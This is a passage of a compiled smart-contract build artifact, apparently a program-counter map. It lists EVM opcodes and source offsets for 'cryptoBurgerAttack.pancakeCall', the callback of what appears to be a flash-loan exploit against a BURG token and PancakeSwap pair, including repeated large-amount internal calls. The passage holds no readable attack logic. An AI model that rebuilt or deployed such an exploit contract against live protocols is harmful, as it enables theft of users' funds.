      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "7784": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        9904,
        9949
      ],
      "op": "JUMP",
      "path": "0"
    },
    "7785": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9904,
        9949
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7786": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9843,
        9959
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7788": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9843,
        9959
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7789": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9843,
        9959
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1EB0"
    },
    "7792": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9843,
        9959
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "7793": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9843,
        9959
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7794": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "7796": {
      "op": "DUP1"
    },
    "7797": {
      "op": "DUP3"
    },
    "7798": {
      "op": "MSTORE"
    },
    "7799": {
      "op": "PUSH1",
      "value": "0x1C"
    },
    "7801": {
      "op": "SWAP1"
    },
    "7802": {
      "op": "DUP3"
    },
    "7803": {
      "op": "ADD"
    },
    "7804": {
      "op": "MSTORE"
    },
    "7805": {
      "op": "PUSH32",
      "value": "0x425552472062616C616E6365206F66205061636B616765207061697200000000"
    },
    "7838": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "7840": {
      "op": "DUP3"
    },
    "7841": {
      "op": "ADD"
    },
    "7842": {
      "op": "MSTORE"
    },
    "7843": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "7845": {
      "op": "DUP2"
    },
    "7846": {
      "op": "ADD"
    },
    "7847": {
      "op": "SWAP2"
    },
    "7848": {
      "op": "SWAP1"
    },
    "7849": {
      "op": "SWAP2"
    },
    "7850": {
      "op": "MSTORE"
    },
    "7851": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "7853": {
      "op": "ADD"
    },
    "7854": {
      "op": "SWAP1"
    },
    "7855": {
      "op": "JUMP"
    },
    "7856": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9843,
        9959
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7857": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9843,
        9959
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7859": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9843,
        9959
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7860": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9843,
        9959
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7861": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9843,
        9959
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "7862": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9843,
        9959
      ],
      "op": "SUB",
      "path": "0"
    },
    "7863": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9843,
        9959
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7864": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9843,
        9959
      ],
      "op": "LOG1",
      "path": "0"
    },
    "7865": {
      "offset": [
        733,
        775
      ],
      "op": "PUSH20",
      "path": "0",
      "value": "0x2B0551B656509754285EEC81EE894338E14C5DD"
    },
    "7886": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "7888": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "7890": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "7892": {
      "op": "SHL"
    },
    "7893": {
      "op": "SUB"
    },
    "7894": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10005
      ],
      "op": "AND",
      "path": "0",
      "statement": 70
    },
    "7895": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10005
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFF6CAE9"
    },
    "7900": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7902": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7903": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7904": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFFFFFFF"
    },
    "7909": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "AND",
      "path": "0"
    },
    "7910": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "7912": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "SHL",
      "path": "0"
    },
    "7913": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7914": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "7915": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "7917": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "ADD",
      "path": "0"
    },
    "7918": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7920": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7922": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7923": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7924": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "DUP4",
      "path": "0"
    },
    "7925": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "SUB",
      "path": "0"
    },
    "7926": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7927": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7929": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "DUP8",
      "path": "0"
    },
    "7930": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7931": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "7932": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "7933": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7934": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "7935": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1F07"
    },
    "7938": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "7939": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7941": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7942": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "REVERT",
      "path": "0"
    },
    "7943": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7944": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "POP",
      "path": "0"
    },
    "7945": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "GAS",
      "path": "0"
    },
    "7946": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "CALL",
      "path": "0"
    },
    "7947": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "7948": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7949": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "7950": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1F1B"
    },
    "7953": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "7954": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "7955": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7957": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7958": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "7959": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "7960": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7962": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "REVERT",
      "path": "0"
    },
    "7963": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7964": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "POP",
      "path": "0"
    },
    "7965": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "POP",
      "path": "0"
    },
    "7966": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "POP",
      "path": "0"
    },
    "7967": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9969,
        10007
      ],
      "op": "POP",
      "path": "0"
    },
    "7968": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10018,
        10079
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 71,
      "value": "0x1F53"
    },
    "7971": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "7973": {
      "op": "DUP1"
    },
    "7974": {
      "op": "MLOAD"
    },
    "7975": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "7977": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "7980": {
      "op": "DUP4"
    },
    "7981": {
      "op": "CODECOPY"
    },
    "7982": {
      "op": "DUP2"
    },
    "7983": {
      "op": "MLOAD"
    },
    "7984": {
      "op": "SWAP2"
    },
    "7985": {
      "op": "MSTORE"
    },
    "7986": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "7988": {
      "op": "DUP1"
    },
    "7989": {
      "op": "MLOAD"
    },
    "7990": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "7992": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "7995": {
      "op": "DUP4"
    },
    "7996": {
      "op": "CODECOPY"
    },
    "7997": {
      "op": "DUP2"
    },
    "7998": {
      "op": "MLOAD"
    },
    "7999": {
      "op": "SWAP2"
    },
    "8000": {
      "op": "MSTORE"
    },
    "8001": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10039,
        10051
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8012": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10053,
        10054
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8014": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10072,
        10076
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8015": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10018,
        10024
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8018": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        10018,
        10079
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8019": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10018,
        10079
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8020": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10089,
        10150
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 72,
      "value": "0x1F87"
    },
    "8023": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8025": {
      "op": "DUP1"
    },
    "8026": {
      "op": "MLOAD"
    },
    "8027": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8029": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8032": {
      "op": "DUP4"
    },
    "8033": {
      "op": "CODECOPY"
    },
    "8034": {
      "op": "DUP2"
    },
    "8035": {
      "op": "MLOAD"
    },
    "8036": {
      "op": "SWAP2"
    },
    "8037": {
      "op": "MSTORE"
    },
    "8038": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8040": {
      "op": "DUP1"
    },
    "8041": {
      "op": "MLOAD"
    },
    "8042": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8044": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8047": {
      "op": "DUP4"
    },
    "8048": {
      "op": "CODECOPY"
    },
    "8049": {
      "op": "DUP2"
    },
    "8050": {
      "op": "MLOAD"
    },
    "8051": {
      "op": "SWAP2"
    },
    "8052": {
      "op": "MSTORE"
    },
    "8053": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10110,
        10122
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8064": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10124,
        10125
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8066": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10143,
        10147
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8067": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10089,
        10095
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8070": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        10089,
        10150
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8071": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10089,
        10150
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8072": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10160,
        10221
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 73,
      "value": "0x1FBB"
    },
    "8075": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8077": {
      "op": "DUP1"
    },
    "8078": {
      "op": "MLOAD"
    },
    "8079": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8081": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8084": {
      "op": "DUP4"
    },
    "8085": {
      "op": "CODECOPY"
    },
    "8086": {
      "op": "DUP2"
    },
    "8087": {
      "op": "MLOAD"
    },
    "8088": {
      "op": "SWAP2"
    },
    "8089": {
      "op": "MSTORE"
    },
    "8090": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8092": {
      "op": "DUP1"
    },
    "8093": {
      "op": "MLOAD"
    },
    "8094": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8096": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8099": {
      "op": "DUP4"
    },
    "8100": {
      "op": "CODECOPY"
    },
    "8101": {
      "op": "DUP2"
    },
    "8102": {
      "op": "MLOAD"
    },
    "8103": {
      "op": "SWAP2"
    },
    "8104": {
      "op": "MSTORE"
    },
    "8105": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10181,
        10193
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8116": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10195,
        10196
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8118": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10214,
        10218
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8119": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10160,
        10166
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8122": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        10160,
        10221
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8123": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10160,
        10221
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8124": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10231,
        10292
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 74,
      "value": "0x1FEF"
    },
    "8127": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8129": {
      "op": "DUP1"
    },
    "8130": {
      "op": "MLOAD"
    },
    "8131": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8133": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8136": {
      "op": "DUP4"
    },
    "8137": {
      "op": "CODECOPY"
    },
    "8138": {
      "op": "DUP2"
    },
    "8139": {
      "op": "MLOAD"
    },
    "8140": {
      "op": "SWAP2"
    },
    "8141": {
      "op": "MSTORE"
    },
    "8142": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8144": {
      "op": "DUP1"
    },
    "8145": {
      "op": "MLOAD"
    },
    "8146": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8148": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8151": {
      "op": "DUP4"
    },
    "8152": {
      "op": "CODECOPY"
    },
    "8153": {
      "op": "DUP2"
    },
    "8154": {
      "op": "MLOAD"
    },
    "8155": {
      "op": "SWAP2"
    },
    "8156": {
      "op": "MSTORE"
    },
    "8157": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10252,
        10264
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8168": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10266,
        10267
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8170": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10285,
        10289
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8171": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10231,
        10237
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8174": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        10231,
        10292
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8175": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10231,
        10292
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8176": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10302,
        10363
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 75,
      "value": "0x2023"
    },
    "8179": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8181": {
      "op": "DUP1"
    },
    "8182": {
      "op": "MLOAD"
    },
    "8183": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8185": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8188": {
      "op": "DUP4"
    },
    "8189": {
      "op": "CODECOPY"
    },
    "8190": {
      "op": "DUP2"
    },
    "8191": {
      "op": "MLOAD"
    },
    "8192": {
      "op": "SWAP2"
    },
    "8193": {
      "op": "MSTORE"
    },
    "8194": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8196": {
      "op": "DUP1"
    },
    "8197": {
      "op": "MLOAD"
    },
    "8198": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8200": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8203": {
      "op": "DUP4"
    },
    "8204": {
      "op": "CODECOPY"
    },
    "8205": {
      "op": "DUP2"
    },
    "8206": {
      "op": "MLOAD"
    },
    "8207": {
      "op": "SWAP2"
    },
    "8208": {
      "op": "MSTORE"
    },
    "8209": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10323,
        10335
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8220": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10337,
        10338
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8222": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10356,
        10360
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8223": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10302,
        10308
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8226": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        10302,
        10363
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8227": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10302,
        10363
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8228": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10373,
        10434
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 76,
      "value": "0x2057"
    },
    "8231": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8233": {
      "op": "DUP1"
    },
    "8234": {
      "op": "MLOAD"
    },
    "8235": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8237": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8240": {
      "op": "DUP4"
    },
    "8241": {
      "op": "CODECOPY"
    },
    "8242": {
      "op": "DUP2"
    },
    "8243": {
      "op": "MLOAD"
    },
    "8244": {
      "op": "SWAP2"
    },
    "8245": {
      "op": "MSTORE"
    },
    "8246": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8248": {
      "op": "DUP1"
    },
    "8249": {
      "op": "MLOAD"
    },
    "8250": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8252": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8255": {
      "op": "DUP4"
    },
    "8256": {
      "op": "CODECOPY"
    },
    "8257": {
      "op": "DUP2"
    },
    "8258": {
      "op": "MLOAD"
    },
    "8259": {
      "op": "SWAP2"
    },
    "8260": {
      "op": "MSTORE"
    },
    "8261": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10394,
        10406
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8272": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10408,
        10409
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8274": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10427,
        10431
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8275": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10373,
        10379
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8278": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        10373,
        10434
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8279": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10373,
        10434
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8280": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10444,
        10505
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 77,
      "value": "0x208B"
    },
    "8283": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8285": {
      "op": "DUP1"
    },
    "8286": {
      "op": "MLOAD"
    },
    "8287": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8289": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8292": {
      "op": "DUP4"
    },
    "8293": {
      "op": "CODECOPY"
    },
    "8294": {
      "op": "DUP2"
    },
    "8295": {
      "op": "MLOAD"
    },
    "8296": {
      "op": "SWAP2"
    },
    "8297": {
      "op": "MSTORE"
    },
    "8298": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8300": {
      "op": "DUP1"
    },
    "8301": {
      "op": "MLOAD"
    },
    "8302": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8304": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8307": {
      "op": "DUP4"
    },
    "8308": {
      "op": "CODECOPY"
    },
    "8309": {
      "op": "DUP2"
    },
    "8310": {
      "op": "MLOAD"
    },
    "8311": {
      "op": "SWAP2"
    },
    "8312": {
      "op": "MSTORE"
    },
    "8313": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10465,
        10477
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x43C33C1937564800000"
    },
    "8324": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10479,
        10480
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "8326": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10498,
        10502
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "8327": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10444,
        10450
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "8330": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        10444,
        10505
      ],
      "op": "JUMP",
      "path": "0"
    },
    "8331": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10444,
        10505
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "8332": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10515,
        10576
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 78,
      "value": "0x20BF"
    },
    "8335": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8337": {
      "op": "DUP1"
    },
    "8338": {
      "op": "MLOAD"
    },
    "8339": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8341": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "8344": {
      "op": "DUP4"
    },
    "8345": {
      "op": "CODECOPY"
    },
    "8346": {
      "op": "DUP2"
    },
    "8347": {
      "op": "MLOAD"
    },
    "8348": {
      "op": "SWAP2"
    },
    "8349": {
      "op": "MSTORE"
    },
    "8350": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "8352": {
      "op": "DUP1"
    },
    "8353": {
      "op": "MLOAD"
    },
    "8354": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "8356": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "8359": {
      "op": "DUP4"
    },
    "8360": {
      "op": "CODECOPY"
    },
    "8361": {
      "op": "DUP2"
    },
    "8362": {
      "op": "MLOAD"
    },
    "8363": {
      "op": "SWAP2"
    },
    "8364": {
      "op": "MSTORE"
    },
    "8365": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        10536,
        10548
